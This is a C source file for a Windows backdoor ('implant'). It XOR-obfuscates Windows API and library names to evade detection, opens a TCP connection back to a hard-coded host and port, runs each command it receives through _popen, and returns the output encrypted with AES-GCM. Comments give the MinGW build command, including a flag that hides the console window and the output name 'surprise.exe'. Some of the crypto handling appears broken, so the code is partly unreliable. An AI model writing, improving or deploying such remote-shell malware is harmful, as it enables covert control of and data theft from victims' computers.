#include "implant.h"
#include "AES.h"
// Compilation command: x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt -s
// futiv command : x86_64-w64-mingw32-gcc Implant.c -o surprise.exe -lws2_32 -lbcrypt -mwindows -s
int main()
{
    // Set variables
    char rcvbuffer[DEFAULT_BUFLEN];
    char sndbuffer[DEFAULT_BUFLEN];
    char command[] = {0x28, 0x26, 0x2F, 0x65, 0x2E, 0x33, 0x2E, 0x00};
    char s_kernel[] = {0x20, 0x2E, 0x39, 0x25, 0x2E, 0x27, 0x78, 0x79, 0x65, 0x2F, 0x27, 0x27, 0x00};                 // kernel32.dll
    char s_createproc[] = {0x08, 0x39, 0x2E, 0x2A, 0x3F, 0x2E, 0x1B, 0x39, 0x24, 0x28, 0x2E, 0x38, 0x38, 0x0A, 0x00}; // CreateProcessA
    char s_ws2_32[] = {0x3C, 0x38, 0x79, 0x14, 0x78, 0x79, 0x00};                                                     // ws2_32.dll
    decode(command, 'K', 7);
    decode(s_kernel, 'K', sizeof(s_kernel) - 1);
    decode(s_createproc, 'K', sizeof(s_createproc) - 1);
    decode(s_ws2_32, 'K', sizeof(s_ws2_32) - 1);
    WSADATA wsa;
    SOCKADDR_IN server;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    // AES initialisation
    BCRYPT_ALG_HANDLE aesAlgorithm = NULL;
    BCRYPT_KEY_HANDLE aesKey = NULL;
    BYTE *pbKeyObject = NULL;
    ULONG cbKeyObject = 0;
    ULONG result = 0;
    NTSTATUS status;
    BYTE pbSecret[32]; // Replace with your AES key bytes (16, 24, or 32 bytes)
    BYTE tag[16];

    ULONG cbSecret = sizeof(pbSecret);
    BYTE nonce[12];

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);

    authInfo.cbNonce = sizeof(nonce);
    authInfo.pbNonce = nonce;
    authInfo.pbTag = tag;
    authInfo.cbTag = sizeof(tag);

    status = BCryptOpenAlgorithmProvider(&aesAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status))
    {
        return 0;
    }

    status = BCryptGenRandom(aesAlgorithm, pbSecret, cbSecret, 0);
    status = BCryptGenRandom(NULL, nonce, sizeof(nonce), 0);
    status = BCryptSetProperty(
        aesAlgorithm,
        BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
        sizeof(BCRYPT_CHAIN_MODE_GCM),
        0);
    if (!BCRYPT_SUCCESS(status))
    {
        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
        return 0;
    }

    status = BCryptGetProperty(
        aesAlgorithm,
        BCRYPT_OBJECT_LENGTH,
        (PUCHAR)&cbKeyObject,
        sizeof(cbKeyObject),
        &result,
        0);
    if (!BCRYPT_SUCCESS(status))
    {
        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
        return 0;
    }

    // Allow memory
    pbKeyObject = HeapAlloc(GetProcessHeap(), 0, cbKeyObject);

    if (pbKeyObject == NULL)
    {
        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
        return 0;
    }

    status = BCryptGenerateSymmetricKey(
        aesAlgorithm,
        &aesKey,
        pbKeyObject,
        cbKeyObject,
        pbSecret,
        cbSecret,
        0);
    if (!BCRYPT_SUCCESS(status))
    {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
        return 0;
    }

    HMODULE hWs2_32 = LoadLibraryA(s_ws2_32);
    if (hWs2_32 == NULL)
    {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
        return 0;
    }


    // RSA initialisation












    char s_WSAStartup[] = {0x1C, 0x18, 0x0A, 0x18, 0x3F, 0x2A, 0x39, 0x3F, 0x3E, 0x3B, 0x00}; // WSAStartup
    char s_WSASocketA[] = {0x1C, 0x18, 0x0A, 0x18, 0x24, 0x28, 0x20, 0x2E, 0x3F, 0x0A, 0x00}; // WSASocketA
    char s_connect[] = {0x28, 0x24, 0x25, 0x25, 0x2E, 0x28, 0x3F, 0x00};                      // connect
    decode(s_WSAStartup, 'K', sizeof(s_WSAStartup) - 1);
    decode(s_WSASocketA, 'K', sizeof(s_WSASocketA) - 1);
    decode(s_connect, 'K', sizeof(s_connect) - 1);

    pWSAStartup myWSAStartup = (pWSAStartup)GetProcAddress(hWs2_32, s_WSAStartup);
    pWSASocketA myWSASocket = (pWSASocketA)GetProcAddress(hWs2_32, s_WSASocketA);
    pConnect myConnect = (pConnect)GetProcAddress(hWs2_32, s_connect);
    if (!myWSAStartup || !myWSASocket || !myConnect)
    {
        FreeLibrary(hWs2_32);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
        return 0;
    }

    if (myWSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        FreeLibrary(hWs2_32);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
        return 0;
    }

    SOCKET soc = myWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (soc == INVALID_SOCKET)
    {
        WSACleanup();
        FreeLibrary(hWs2_32);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
        return 0;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(2600);
    server.sin_addr.s_addr = inet_addr("10.23.141.240");

    if (myConnect(soc, (struct sockaddr *)&server, sizeof(server)) != 0)
    {
        closesocket(soc);
        WSACleanup();
        FreeLibrary(hWs2_32);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
        return 0;
    }

    FILE *pipe = NULL;
    int kill = 1;
    int checker;
    char received_message[512];
    int received_message_len = 0;
    while (kill == 1)
    {
        checker = recv_all(soc, rcvbuffer, 4);
        if (checker <= 0)
            return 1; // error in recv_all
        unsigned int cmdlen = (unsigned char)rcvbuffer[0] |
                              ((unsigned char)rcvbuffer[1] << 8) |
                              ((unsigned char)rcvbuffer[2] << 16) |
                              ((unsigned char)rcvbuffer[3] << 24);
        recv_all(soc, received_message, cmdlen);
        decrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)received_message, (int)strlen(received_message),
                                    rcvbuffer, sizeof(rcvbuffer), &cmdlen,
                                    tag, sizeof(tag), &authInfo);
        rcvbuffer[cmdlen] = '\0';

        if (rcvbuffer[0] == '#')
            kill = 0; // kill program if serveur say #
        else
        {
            pipe = _popen(rcvbuffer, "r");
            if (pipe == NULL)
            {
                // Command failed to execute
                const char *error_msg = "ERROR: Failed to execute command\n";
                if (send_all(soc, (char *)error_msg, (int)strlen(error_msg)) <= 0)
                    return 1;
            }
            else
            {
                int ciphertext_len = 0;
                char buf[512];
                char result_buf[512];
                int send_result;
                while (fgets(buf, sizeof(buf), pipe) != NULL)
                {
                    encrypt_message(aesKey, nonce, sizeof(nonce), (BYTE *)buf, (int)strlen(buf),
                                    result_buf, sizeof(result_buf), &ciphertext_len,
                                    tag, sizeof(tag));

                    send_result = send_all(soc, result_buf, (int)strlen(result_buf));
                    // send_result = send(soc, buf, (int)strlen(buf), 0);
                    if (send_result <= 0)
                    {
                        _pclose(pipe);
                        return 1; // Connection lost, exit
                    }
                }
                _pclose(pipe);
            }
        }
    }

    // cleanup
    if (kill == 0)
    {
        closesocket(soc);
        WSACleanup();
    }

    if (aesKey)
    {
        BCryptDestroyKey(aesKey);
    }
    if (pbKeyObject)
    {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }
    if (aesAlgorithm)
    {
        BCryptCloseAlgorithmProvider(aesAlgorithm, 0);
    }
    return 0;
}

char *decode(char *message, char key, int lenght)
{
    for (int i = 0; i < lenght; i++)
    {
        message[i] = message[i] ^ key;
    }
    return message;
}

int recv_all(SOCKET sock, char *buff, int len)
{
    int received = 0;
    int total = 0;
    while (total < len)
    {
        received = recv(sock, buff + total, len - total, 0);
        if (received <= 0)
            return received;
        total += received;
    }
    return total;
}

int send_all(SOCKET sock, char *buff, int len)
{
    int sent = 0;
    int total = 0;
    while (total < len)
    {
        sent = send(sock, buff + total, len - total, 0);
        if (sent <= 0)
            return sent;
        total += sent;
    }
    return total;
}

